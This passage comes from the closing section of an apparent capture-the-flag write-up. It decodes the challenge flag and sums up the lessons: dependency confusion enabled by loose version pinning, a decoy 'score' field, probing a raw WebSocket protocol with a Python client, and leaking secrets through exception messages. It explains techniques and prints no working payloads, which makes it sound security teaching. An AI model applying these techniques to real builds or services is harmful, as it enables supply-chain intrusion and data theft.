In leetspeak this reads “Through victory my chains ~ break token,” echoing how the secret only leaked once this chain was broken by turning the exception message into an exfiltration channel. Takeaways Dependency confusion is a real and quickly-exploitable flaw. As long as a same-named, higher-versioned package can be slipped into a source the build process trusts, the attacker’s code gets installed and runs. The root cause is pinning only a lower-bound version (>=1.0.0) without specifying a source index or hash verification. Don’t trust the field that merely looks like “success” on screen. score looks like a validation result but is just a static string comparison unrelated to whether the package works, there to steer you toward a dead-end command (DEPLOY_SOLAR_PANEL). The field that actually matters, gateway_upload.ok, is easily overshadowed by the flashier one beside it. Talk to the underlying protocol directly instead of only through the front end. The React page only sends fixed-format {"type":"command",...}; writing a Python WebSocket client to hit the raw protocol lets you feed malformed messages and catch the interleaving of requests and responses. Error messages are an exfiltration channel.
